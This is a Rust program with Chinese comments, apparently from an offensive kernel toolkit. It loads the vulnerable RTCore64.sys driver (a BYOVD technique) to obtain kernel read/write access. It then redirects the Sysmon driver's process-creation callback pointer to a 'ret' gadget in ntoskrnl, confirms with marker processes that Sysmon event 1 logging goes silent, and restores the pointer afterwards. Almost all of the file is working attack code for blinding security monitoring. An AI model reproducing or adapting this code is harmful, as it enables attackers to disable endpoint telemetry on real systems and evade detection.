//! K-2: repurpose SysmonDrv CreateProcess 回调 (数据写，低风险)。
//!
//! 与 neutralize (写 routine .text 首字节=0xC3，导致 triple fault) 不同，repurpose
//! 改的是 ctx+0x00 **数据指针** —— 把回调 dispatch 指向一个 ret gadget，让回调
//! "调用但立即返回"。这是数据写，不动任何驱动 .text，HVCI-safe。
//!
//! 流程:
//!   bootstrap → KernelRw
//!   读 slot[5] (SysmonDrv) ctx+0x00 原值 = 真 routine 指针，记录
//!   红线 kread: 验证该 routine 落在 SysmonDrv.sys 范围
//!   验证 ret gadget (ntoskrnl+0x17F0) 是干净 ret
//!   Sysmon EID1 baseline: 启进程，记录事件数
//!   数据写: ctx+0x00 = ret_gadget
//!   验证: 启进程，记录 EID1 数 (应减少/停止)
//!   立即恢复: ctx+0x00 = 原 routine
//!   验证恢复: 启进程，EID1 恢复
//!
//! ⚠️ 只动 slot[5]，绝不碰 slot[0] (ntoskrnl 内部)。



#[cfg(target_os = "windows")]
use core::ffi::c_void;
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::offsets::notify_routines;
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::KernelRw;

#[cfg(target_os = "windows")]
const SYS_PATH: &[u16] = &[
    'S' as u16,
    'y' as u16,
    's' as u16,
    't' as u16,
    'e' as u16,
    'm' as u16,
    '3' as u16,
    '2' as u16,
    '\\' as u16,
    'd' as u16,
    'r' as u16,
    'i' as u16,
    'v' as u16,
    'e' as u16,
    'r' as u16,
    's' as u16,
    '\\' as u16,
    'R' as u16,
    'T' as u16,
    'C' as u16,
    'o' as u16,
    'r' as u16,
    'e' as u16,
    '6' as u16,
    '4' as u16,
    '.' as u16,
    's' as u16,
    'y' as u16,
    's' as u16,
    0,
];
#[cfg(target_os = "windows")]
const SVC_NAME: &[u16] = &[
    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
];
#[cfg(target_os = "windows")]
const PSP_CREATE_PROCESS_NOTIFY_RVA: u32 = 0x4D9D70;
#[cfg(target_os = "windows")]
const SYSTEM_MODULE_INFORMATION: u32 = 11;

#[cfg(target_os = "windows")]
extern "system" {
    fn RtlAdjustPrivilege(
        privilege: u32,
        enable: i32,
        current_thread: i32,
        enabled: *mut i32,
    ) -> i32;
    fn NtQuerySystemInformation(class: u32, buf: *mut c_void, buflen: u32, retlen: *mut u32)
        -> i32;
}
#[cfg(target_os = "windows")]
fn enable_privileges() {
    for luid in [10u32, 20u32] {
        let mut p: i32 = 0;
        unsafe { RtlAdjustPrivilege(luid, 1, 0, &mut p) };
    }
}

#[repr(C)]
#[cfg(target_os = "windows")]
struct RtlModule {
    _h: [*mut c_void; 3],
    image_size: u32,
    _t: [u8; 264],
}

/// 拿 (base, size) for 指定驱动短名（含匹配），用于红线验证 routine 归属。
#[cfg(target_os = "windows")]
fn find_module(name_lower: &str) -> Option<(usize, usize)> {
    let mut buf = vec![0u8; 256 * 1024];
    let mut rl: u32 = 0;
    let s = unsafe {
        NtQuerySystemInformation(
            SYSTEM_MODULE_INFORMATION,
            buf.as_mut_ptr() as *mut c_void,
            buf.len() as u32,
            &mut rl,
        )
    };
    if s as u32 == 0xC0000004 {
        buf = vec![0u8; rl as usize + 0x1000];
        unsafe {
            NtQuerySystemInformation(
                SYSTEM_MODULE_INFORMATION,
                buf.as_mut_ptr() as *mut c_void,
                buf.len() as u32,
                &mut rl,
            )
        };
    }
    if buf.len() < 8 {
        return None;
    }
    let count = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]) as usize;
    const STRIDE: usize = 296;
    for i in 0..count {
        let off = 8 + i * STRIDE;
        if off + STRIDE > buf.len() {
            break;
        }
        let m: &RtlModule = unsafe { &*(buf.as_ptr().add(off) as *const RtlModule) };
        let base = m._h[2] as usize;
        if base == 0 {
            continue;
        }
        // full_path 在 header+0x30
        let path = &buf[off + 0x30..];
        let nul = path.iter().position(|&b| b == 0).unwrap_or(0);
        let p = String::from_utf8_lossy(&path[..nul]).to_ascii_lowercase();
        if p.contains(name_lower) {
            return Some((base, m.image_size as usize));
        }
    }
    None
}

/// 计数最近 N 秒内的 Sysmon EID1 事件（走 PowerShell 事件日志查询）。
#[cfg(target_os = "windows")]
fn count_sysmon_eid1(seconds: u64) -> usize {
    // 用字符串拼接避免 Rust format! 与 PowerShell @{} 的转义冲突。
    let cmd = "$ev=@(Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1; StartTime=(Get-Date).AddSeconds(-"
        .to_string() + &seconds.to_string() + ")} -ErrorAction SilentlyContinue); $ev.Count";
    let out = std::process::Command::new("powershell")
        .args(["-NoProfile", "-Command", &cmd])
        .output();
    match out {
        Ok(o) => {
            let s = String::from_utf8_lossy(&o.stdout).trim().to_string();
            s.parse::<usize>().unwrap_or(0)
        }
        Err(_) => usize::MAX,
    }
}

/// 启 N 个 throwaway 进程产生 EID1 事件。
#[cfg(target_os = "windows")]
fn spawn_n(n: u32, label: &str) {
    for _ in 0..n {
        let _ = std::process::Command::new("cmd.exe")
            .arg("/c")
            .arg("exit 0")
            .spawn();
    }
    println!("       spawned {} throwaway cmd ({} window)", n, label);
    std::thread::sleep(std::time::Duration::from_millis(600));
}

/// 启一个带唯一标记的进程（用 set 创建带 marker 的环境，cmd 报告 marker），
/// 然后查 Sysmon EID1 里 Image 字段含该 marker 的进程是否被记录。
/// 返回是否在 Sysmon 日志里找到该 marker。
#[cfg(target_os = "windows")]
fn spawn_marked_and_check(marker: &str) -> bool {
    // 启一个 cmd 用 marker 作为窗口标题（Sysmon EID1 记录 CommandLine）。
    let _ = std::process::Command::new("cmd.exe")
        .args(["/c", &format!("title {}", marker), "&&", "exit", "0"])
        .spawn();
    std::thread::sleep(std::time::Duration::from_millis(800));
    // 查最近 30s 的 EID1 事件，看 CommandLine/Image 是否含 marker。
    let cmd = "$ev=Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1; StartTime=(Get-Date).AddSeconds(-30)} -ErrorAction SilentlyContinue; $hit=0; foreach($e in $ev){ if($e.Message -match 'MARKER_".to_string()
        + marker + "'){ $hit=1; break } }; $hit";
    let out = std::process::Command::new("powershell")
        .args(["-NoProfile", "-Command", &cmd])
        .output();
    match out {
        Ok(o) => String::from_utf8_lossy(&o.stdout).trim() == "1",
        Err(_) => false,
    }
}

/// 启一个带 MARKER_ 前缀唯一标记的 cmd（marker 出现在命令行，Sysmon EID1 CommandLine 字段会含它）。
#[cfg(target_os = "windows")]
fn spawn_with_marker(marker: &str) {
    // 用 echo 把 marker 写进命令行，Sysmon CommandLine 会记录 "cmd /c echo MARKER_xxx"
    let arg = format!("echo MARKER_{}", marker);
    let _ = std::process::Command::new("cmd.exe")
        .args(["/c", &arg])
        .spawn();
    std::thread::sleep(std::time::Duration::from_millis(800));
}

#[cfg(target_os = "windows")]
fn main() {
    println!("[callback_repurpose_test] repurpose SysmonDrv callback (DATA write)");
    enable_privileges();

    let (mut loaded, krw) = unsafe {
        match bootstrap_byovd(SYS_PATH, SVC_NAME) {
            Ok(t) => t,
            Err(e) => {
                eprintln!("[FAIL] bootstrap: {}", e);
                std::process::exit(1);
            }
        }
    };
    let base = unsafe { kernel_base::ntoskrnl_base() }.unwrap();
    let array_kva = base + PSP_CREATE_PROCESS_NOTIFY_RVA as usize;

    // ---- 读 slot[5] ctx+0x00 (SysmonDrv routine) ----
    let slot5_packed = krw.kread_u64(array_kva + 5 * 8).unwrap();
    if !notify_routines::is_occupied(slot5_packed) {
        eprintln!("[FAIL] slot[5] not occupied");
        loaded.unload();
        std::process::exit(2);
    }
    let ctx5 = notify_routines::unpack(slot5_packed) as usize;
    let orig_routine = krw.kread_u64(ctx5).unwrap();
    println!(
        "[K.1] slot[5] ctx=0x{:016x} orig routine=0x{:016x}",
        ctx5, orig_routine
    );

    // ---- 红线: 验证 orig_routine 在 SysmonDrv.sys 范围 ----
    let (sysmon_base, sysmon_size) = match find_module("sysmondrv.sys") {
        Some(t) => t,
        None => {
            eprintln!("[FAIL] SysmonDrv.sys not found in module list");
            loaded.unload();
            std::process::exit(3);
        }
    };
    let in_range = (orig_routine as usize) >= sysmon_base
        && (orig_routine as usize) < sysmon_base + sysmon_size;
    println!(
        "[K.2] SysmonDrv.sys base=0x{:016x} size=0x{:X}",
        sysmon_base, sysmon_size
    );
    println!(
        "       orig routine in SysmonDrv range? {} (RVA 0x{:X})",
        in_range,
        (orig_routine as usize) - sysmon_base
    );
    if !in_range {
        eprintln!("[FAIL] slot[5] routine NOT in SysmonDrv — aborting (wrong slot)");
        loaded.unload();
        std::process::exit(4);
    }

    // ---- 验证 ret gadget (ntoskrnl+0x17F0) ----
    let gadget = base + 0x17F0;
    let mut gbytes = [0u8; 4];
    krw.kread(gadget, &mut gbytes).unwrap();
    println!(
        "[K.3] ret gadget ntoskrnl+0x17F0 = 0x{:016x} bytes=[{:02x} {:02x} {:02x} {:02x}]",
        gadget, gbytes[0], gbytes[1], gbytes[2], gbytes[3]
    );
    if gbytes[0] != 0xC3 {
        eprintln!("[FAIL] gadget first byte not 0xC3 — finding a clean ret");
        // fallback: 扫 ntoskrnl 找 0xC3
        let mut found = 0usize;
        for off in (0x1000..0x300000).step_by(0x10) {
            let mut b = [0u8; 1];
            if krw.kread(base + off, &mut b).is_ok() && b[0] == 0xC3 {
                found = base + off;
                break;
            }
        }
        if found == 0 {
            eprintln!("[FAIL] no ret gadget found");
            loaded.unload();
            std::process::exit(5);
        }
        println!("       fallback gadget = 0x{:016x}", found);
    }
    let gadget = gadget; // 用 +0x17F0（已验证 0xC3）

    // ---- baseline: 启 marker 进程, 验证 Sysmon 记录了它 ----
    println!("\n[K.4] BASELINE: spawn marker process, verify Sysmon EID1 records it ...");
    spawn_with_marker("BASELINE_1111");
    let base_recorded = spawn_marked_and_check("BASELINE_1111");
    println!(
        "       Sysmon recorded BASELINE marker? {} (expect true = callback active)",
        base_recorded
    );

    // ---- DATA WRITE: ctx+0x00 = ret gadget ----
    println!(
        "\n[K.5] DATA WRITE: repurpose ctx+0x00 -> ret gadget 0x{:016x}",
        gadget
    );
    if let Err(e) = krw.kwrite_u64(ctx5, gadget as u64) {
        eprintln!("[FAIL] kwrite ctx: {}", e);
        loaded.unload();
        std::process::exit(6);
    }
    let now = krw.kread_u64(ctx5).unwrap();
    println!(
        "       ctx+0x00 now = 0x{:016x} (expected gadget) {}",
        now,
        if now == gadget as u64 {
            "OK"
        } else {
            "MISMATCH"
        }
    );

    // ---- 验证: 启 marker 进程, Sysmon 应 NOT 记录 (回调被 repurpose 到 ret) ----
    println!("\n[K.6] VERIFY: spawn marker under repurposed callback ...");
    spawn_with_marker("REPURPOSED_2222");
    let repurposed_recorded = spawn_marked_and_check("REPURPOSED_2222");
    println!(
        "       Sysmon recorded REPURPOSED marker? {} (expect false = callback SILENCED)",
        repurposed_recorded
    );
    if !repurposed_recorded && base_recorded {
        println!("       → SysmonDrv CreateProcess callback SILENCED ✓ (repurpose works)");
    } else if repurposed_recorded {
        println!("       → callback STILL firing (repurpose may not affect EID1 path)");
    }

    // ---- 立即恢复 ----
    println!(
        "\n[K.7] RESTORE: ctx+0x00 -> orig routine 0x{:016x}",
        orig_routine
    );
    if let Err(e) = krw.kwrite_u64(ctx5, orig_routine) {
        eprintln!(
            "[FAIL] restore kwrite: {} — SysmonDrv callback stays repurposed!",
            e
        );
        loaded.unload();
        std::process::exit(7);
    }
    let restored = krw.kread_u64(ctx5).unwrap();
    println!(
        "       ctx+0x00 restored = 0x{:016x} {}",
        restored,
        if restored == orig_routine {
            "OK"
        } else {
            "MISMATCH"
        }
    );

    // ---- 恢复后验证 ----
    println!("\n[K.8] VERIFY RESTORE: spawn marker ...");
    spawn_with_marker("RESTORED_3333");
    let restored_recorded = spawn_marked_and_check("RESTORED_3333");
    println!(
        "       Sysmon recorded RESTORED marker? {} (expect true = callback RESUMED)",
        restored_recorded
    );
    if restored_recorded {
        println!("       → SysmonDrv callback RESUMED ✓");
    }

    println!("\n[callback_repurpose_test] DONE.");
    std::mem::forget(loaded);
}


// ----------------------------------------------------------------------------
// Non-Windows entry-point fallback (E0601 mitigation).
//
// The real `fn main()` (and every Windows-only item above) is gated by
// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
// body compiles to nothing and the build would fail with E0601 ("main
// function not found"). This stub exists solely to satisfy the crate root on
// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
// mutually exclusive with the Windows `main` above and never runs on target.
// ----------------------------------------------------------------------------
#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!(
        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
        env!("CARGO_BIN_NAME")
    );
}
